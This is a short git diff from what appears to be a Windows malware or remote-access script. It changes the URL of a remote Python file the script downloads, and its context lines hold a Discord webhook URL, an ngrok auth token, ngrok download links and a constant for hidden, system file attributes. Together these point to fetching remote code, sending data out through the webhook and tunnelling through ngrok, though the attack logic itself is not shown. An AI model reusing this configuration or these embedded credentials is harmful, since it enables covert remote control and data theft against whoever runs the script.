@@ -25,7 +25,7 @@ HIDDEN_ATTR = 0x2 | 0x4  # HIDDEN + SYSTEM
 
 # ====== الإعدادات ======
 WEBHOOK_URL = "https://discord.com/api/webhooks/1468726823360663818/uoosMH5ytX_fET8w1XYfMTrBOqfyJd2YPF1GvZup_InXaoWeFp41TC-omJ6e1pa38QiT"
-SCR_PY_URL = "https://raw.githubusercontent.com/silencekiller121/aa/main/scr.py"
+SCR_PY_URL = "https://raw.githubusercontent.com/silencekiller121/aa/main/hab.py"
 NGROK_TOKEN = "2kk7ztO8NUN7U9205uKKy8vpwM2_3B4yKGo3hAZEanPHSxBu1"
 NGROK_DOWNLOAD_URLS = [
     "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip",
